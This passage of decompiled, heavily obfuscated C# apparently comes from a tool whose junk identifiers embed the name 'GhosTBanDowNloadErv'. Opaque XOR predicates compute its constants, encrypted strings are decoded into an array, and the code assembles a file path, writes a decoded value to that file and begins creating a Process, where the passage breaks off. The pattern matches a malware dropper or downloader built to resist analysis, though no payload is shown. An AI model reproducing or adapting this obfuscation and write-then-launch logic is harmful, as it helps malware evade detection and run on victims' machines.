		if ((((int)Math.Floor(560678097.7761536) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿.卄_FFFD()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(1563786770.7761536) + (int)double.Parse(_FFFD山_FFFDㄖ卄ㄖᗪㄩ()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(2086585329.7761536) + (int)double.Parse(ㄩᗪ_3024ᐯ讠_FFFD()) + (nint)Type.EmptyTypes.LongLength)
		{
			num25 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(_2ECF讠山_2ECF_FFFD()) + (nint)Type.EmptyTypes.LongLength);
			num26 += sizeof(float);
		}
		array3[num26] = _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(丂ㄩ());
		int num27 = (int)((int)Math.Floor(-778.2238464532112) + (int)double.Parse(_2ECF讠讠山讠()) + (nint)Type.EmptyTypes.LongLength);
		nint num28 = (int)Math.Floor(-782.2238464532112) + (int)double.Parse(卄讠_FFFD丿ㄩ丿ᐯ_FFFD_3024()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(238372866.77615353) + (int)double.Parse(闩卄ᐯ()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(100898792.77615355) + (int)double.Parse(ㄩ讠讠()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(137809624.77615353) + (int)double.Parse(卄丂()) + (nint)Type.EmptyTypes.LongLength)
		{
			num27 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(ᐯ_2ECF_FFFD_FFFD()) + (nint)Type.EmptyTypes.LongLength);
			num28 += sizeof(float);
		}
		array3[num28] = _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(山_FFFD卄丿_FFFD闩_2F15ᐯ_FFFD());
		int num29 = (int)((int)Math.Floor(-777.2238464532112) + (int)double.Parse(_D83D_DF57_FFFD_2ECFᐯ丿丿()) + (nint)Type.EmptyTypes.LongLength);
		nint num30 = (int)Math.Floor(-781.2238464532112) + (int)double.Parse(_FFFDㄖ_FFFD卄讠ᗪㄖ闩()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(287609370.77615356) + (int)double.Parse(闩_FFFDㄖ_2F15丂闩()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(180691679.77615353) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿._FFFD()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(467774903.77615356) + (int)double.Parse(ᐯ闩()) + (nint)Type.EmptyTypes.LongLength)
		{
			num29 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(_2ECF_FFFD_2ECF_FFFD闩_2ECF丂_FFFD()) + (nint)Type.EmptyTypes.LongLength);
			num30 += sizeof(float);
		}
		array3[num30] = _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿._FFFD());
		int num31 = (int)((int)Math.Floor(-776.2238464532112) + (int)double.Parse(_FFFD_FFFD()) + (nint)Type.EmptyTypes.LongLength);
		nint num32 = (int)Math.Floor(-780.2238464532112) + (int)double.Parse(_FFFDᗪ()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(1429661558.7761536) + (int)double.Parse(讠_2ECF丿_FFFD()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(1255973591.7761536) + (int)double.Parse(闩ᐯ_FFFD_3024()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(535448659.77615356) + (int)double.Parse(丂丂ㄩ丿_2ECF()) + (nint)Type.EmptyTypes.LongLength)
		{
			num31 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(讠_FFFD_D835_DCDDㄩ山丂卄_FFFD()) + (nint)Type.EmptyTypes.LongLength);
			num32 += sizeof(float);
		}
		array3[num32] = _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(_FFFD_FFFDᗪ卄_FFFDᐯ());
		int num33 = (int)((int)Math.Floor(-775.2238464532112) + (int)double.Parse(ᐯᐯ闩_2ECF_FFFD_FFFDᐯ卄()) + (nint)Type.EmptyTypes.LongLength);
		nint num34 = (int)Math.Floor(-779.2238464532112) + (int)double.Parse(ᐯ闩ㄖ丿_FFFD丿ㄩ讠丿()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(1260410537.7761536) + (int)double.Parse(_FFFD丂ᐯㄖ_D83D_DF57ㄩ讠()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(1238647634.7761536) + (int)double.Parse(_FFFD卄ᗪ山闩()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(49552585.77615355) + (int)double.Parse(ᐯ_3024_2ECF丿山_FFFDᗪ()) + (nint)Type.EmptyTypes.LongLength)
		{
			num33 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(讠_FFFD_2F15()) + (nint)Type.EmptyTypes.LongLength);
			num34 += sizeof(float);
		}
		array3[num34] = _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(丂ᗪ丿ᗪ());
		int num35 = (int)((int)Math.Floor(-774.2238464532112) + (int)double.Parse(_FFFD_2F15闩丿_FFFD()) + (nint)Type.EmptyTypes.LongLength);
		nint num36 = (int)Math.Floor(-778.2238464532112) + (int)double.Parse(_D835_DF57丿_2F15()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(1104738627.7761536) + (int)double.Parse(讠卄_3024_2ECFㄩ_2ECF_FFFDᐯ_3024()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(425196036.77615356) + (int)double.Parse(_FFFD_2ECF卄ᗪ_2F15_FFFD卄ᐯ()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(1485766197.7761536) + (int)double.Parse(_FFFD丿ㄩ_3024丿()) + (nint)Type.EmptyTypes.LongLength)
		{
			num35 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(_2ECF_FFFD_2ECF_FFFDᗪ_2ECFᗪ讠ᐯ()) + (nint)Type.EmptyTypes.LongLength);
			num36 += sizeof(float);
		}
		array3[num36] = _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿._2ECF丂());
		int num37 = (int)((int)Math.Floor(-773.2238464532112) + (int)double.Parse(ᐯ卄丂_3024卄_FFFD_2F15()) + (nint)Type.EmptyTypes.LongLength);
		nint num38 = (int)Math.Floor(-777.2238464532112) + (int)double.Parse(丂闩丂ㄩ丿卄山()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(1255312018.7761536) + (int)double.Parse(_FFFDㄩㄩ丿()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(749766769.7761536) + (int)double.Parse(ㄩ_FFFDᗪ()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(1717699537.7761536) + (int)double.Parse(_FFFD卄闩ᐯ_2ECF讠ㄩ_FFFD_FFFD()) + (nint)Type.EmptyTypes.LongLength)
		{
			num37 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(讠闩ᐯ_FFFD_2ECF_2ECF_2ECF()) + (nint)Type.EmptyTypes.LongLength);
			num38 += sizeof(float);
		}
		array3[num38] = _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(ᗪ丂卄_FFFD());
		int num39 = (int)((int)Math.Floor(-772.2238464532112) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿.讠()) + (nint)Type.EmptyTypes.LongLength);
		nint num40 = (int)Math.Floor(-776.2238464532112) + (int)double.Parse(_FFFD_2ECF_2ECF_2F15()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(740711029.7761536) + (int)double.Parse(_FFFDㄩ_2ECFㄖㄩ()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(155615390.77615353) + (int)double.Parse(闩ᐯᗪ()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(627104545.7761536) + (int)double.Parse(_3024丂ᗪ_FFFD_FFFD_FFFD_FFFDᐯ()) + (nint)Type.EmptyTypes.LongLength)
		{
			num39 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(丿ᐯ卄_2ECF闩_FFFD()) + (nint)Type.EmptyTypes.LongLength);
			num40 += sizeof(float);
		}
		array3[num40] = _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿.卄());
		int num41 = (int)((int)Math.Floor(-771.2238464532112) + (int)double.Parse(_2ECF_FFFD()) + (nint)Type.EmptyTypes.LongLength);
		nint num42 = (int)Math.Floor(-775.2238464532112) + (int)double.Parse(ᗪᐯ卄ᐯᐯ丿卄卄_3024()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(563763575.7761536) + (int)double.Parse(山()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(1111977403.7761536) + (int)double.Parse(ᐯㄩ_3024讠_FFFDㄩ丿卄山()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(1675438398.7761536) + (int)double.Parse(ㄖᐯ讠卄讠_FFFD_2ECF丿()) + (nint)Type.EmptyTypes.LongLength)
		{
			num41 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(ᐯ卄ㄖ丂丿_FFFD_FFFD()) + (nint)Type.EmptyTypes.LongLength);
			num42 += sizeof(float);
		}
		array3[num42] = _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(丂_2F15山());
		int num43 = (int)((int)Math.Floor(-770.2238464532112) + (int)double.Parse(丂_FFFD_FFFD_FFFD丿卄ᗪ()) + (nint)Type.EmptyTypes.LongLength);
		nint num44 = (int)Math.Floor(-774.2238464532112) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿._2ECF()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(483200444.77615356) + (int)double.Parse(丿()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(577636798.7761536) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿.卄_FFFD()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(1050876152.7761536) + (int)double.Parse(ᐯ山_3024_2F15丂闩_FFFD卄()) + (nint)Type.EmptyTypes.LongLength)
		{
			num43 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(_FFFD_2ECF丿_2ECF_2ECFㄩᐯ()) + (nint)Type.EmptyTypes.LongLength);
			num44 += sizeof(float);
		}
		array3[num44] = _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(ㄖ_2ECF_2ECF_2ECFㄩ());
		string[] array4 = array3;
		int num45 = (int)((int)Math.Floor(-776.2238464532112) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿.丂()) + (nint)Type.EmptyTypes.LongLength);
		nint num46 = (int)Math.Floor(-780.2238464532112) + (int)double.Parse(讠丂ᐯᗪᗪ丂_2ECFᗪ_FFFD()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(756125853.7761536) + (int)double.Parse(ᗪ_FFFDㄖ卄ㄩ_FFFD丿()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(1969075892.7761536) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿.丂()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(1481385819.7761536) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿._FFFD()) + (nint)Type.EmptyTypes.LongLength)
		{
			num45 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(ㄩ卄ㄩ_2ECF_2ECF丿_FFFD丂()) + (nint)Type.EmptyTypes.LongLength);
			num46 += sizeof(float);
		}
		string text3 = 卄_2ECF_FFFDᐯ_2ECF讠讠讠_FFFD_2ECF_2ECF丿_FFFD_2F15_FFFD卄_2ECF闩_FFFD_FFFD_2ECF卄ᐯᐯ_2F15丿_FFFD山丿ㄩ闩闩_FFFDᐯGhosTBanDowNloadErv3421342342ᗪ_2ECF卄_FFFD_2ECF_FFFD_2F15ᗪ_FFFD_3024_FFFD_FFFD_2ECF卄_FFFD_3024ᗪ讠ᐯㄩ_FFFDᐯㄩ讠讠讠ㄩㄖ_2ECFᗪㄩ_2ECF丿_FFFD((int)num46);
		int num47 = (int)((int)Math.Floor(-781.2238464532112) + (int)double.Parse(_FFFD_2ECF_2ECF丂ᐯ_FFFD()) + (nint)Type.EmptyTypes.LongLength);
		nint num48 = (int)Math.Floor(-785.2238464532112) + (int)double.Parse(卄_3024()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(9209287.776153548) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿._FFFD()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(98967194.77615355) + (int)double.Parse(_FFFD卄_D835_DF57山_2ECFᐯᐯㄩ()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(90875503.77615355) + (int)double.Parse(讠卄_2F15()) + (nint)Type.EmptyTypes.LongLength)
		{
			num47 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(丿ᗪ_3024_FFFD丿山ᐯᐯ()) + (nint)Type.EmptyTypes.LongLength);
			num48 += sizeof(float);
		}
		int num49 = (int)((int)Math.Floor(-773.2238464532112) + (int)double.Parse(_FFFDㄖᐯ卄丂山卄ㄖ()) + (nint)Type.EmptyTypes.LongLength);
		nint num50 = (int)Math.Floor(-777.2238464532112) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿._2ECF()) + (nint)Type.EmptyTypes.LongLength;
		if ((((int)Math.Floor(529994025.77615356) + (int)double.Parse(ㄩ卄讠丿_FFFD山_3024ㄩ()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(1620026655.7761536) + (int)double.Parse(卄ᗪ山丿_FFFD()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(2132326668.7761536) + (int)double.Parse(卄丂_2ECF讠_3024()) + (nint)Type.EmptyTypes.LongLength)
		{
			num49 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(丿_FFFDㄖ()) + (nint)Type.EmptyTypes.LongLength);
			num50 += sizeof(float);
		}
		int num51 = _FFFD_FFFDㄖ卄丿ㄩ_FFFDᗪ_FFFDᐯ_FFFDᗪ_FFFDᐯ卄闩ㄩ闩_FFFD_2ECF_FFFDᐯ卄山ᗪ卄_FFFD_2ECFᗪ_2ECFᗪ卄ᐯ卄GhosTBanDowNloadErv3421342342ᗪ_2F15_2ECFᗪ卄丂_FFFD_2F15讠_2ECF闩_FFFD_D83D_DF57_2ECFᐯ山ᗪ丿ᐯㄩ_FFFD丿卄_FFFDㄩ_FFFD_2F15ᗪᗪ讠ㄩ丿丿((int)num48, (int)num50);
		string text4 = ((delegate*<string?, string?, string?, string?, string>)(&string.Concat))(array2[num51], _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(卄丂丂_FFFD_2ECF()), text3, _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(_FFFD卄_2ECF()));
		try
		{
			string value = _003CModule_003E.讠ㄩᐯㄩ讠卄_2F15丿山_3024卄卄卄_2ECFᐯ山闩山_FFFD_D835_DF57ᐯ卄ᐯ_FFFD_2ECFᗪㄩ卄_2ECFᐯ丂卄讠GhosTBanDowNloadErv3421342342讠讠ㄩᐯ_FFFD_FFFDᐯᐯ讠ᗪ_FFFDᐯㄩㄩ_2F15丂闩ᗪ_FFFD丿ㄩㄖ_FFFDㄖㄩㄩ_2ECF丂ᐯ山_FFFD丂卄ᗪ(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿.ㄩ());
			int num52 = (int)((int)Math.Floor(-780.2238464532112) + (int)double.Parse(丿_FFFDᐯ丿丿()) + (nint)Type.EmptyTypes.LongLength);
			nint num53 = (int)Math.Floor(-784.2238464532112) + (int)double.Parse(_2ECF卄卄_2ECFᗪ_FFFD()) + (nint)Type.EmptyTypes.LongLength;
			if ((((int)Math.Floor(694900198.7761536) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿._2ECF丂()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(1184790766.7761536) + (int)double.Parse(_2ECF丂_FFFD_3024ᐯ卄丿ㄖㄩ()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(1878335482.7761536) + (int)double.Parse(讠ᐯ卄卄()) + (nint)Type.EmptyTypes.LongLength)
			{
				num52 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(ᗪ_2ECF_2ECF_FFFD山ㄖ闩卄_FFFD()) + (nint)Type.EmptyTypes.LongLength);
				num53 += sizeof(float);
			}
			using (StreamWriter streamWriter = new StreamWriter(text4, (byte)num53 != 0))
			{
				streamWriter.WriteLine(value);
			}
			Process process = new Process();
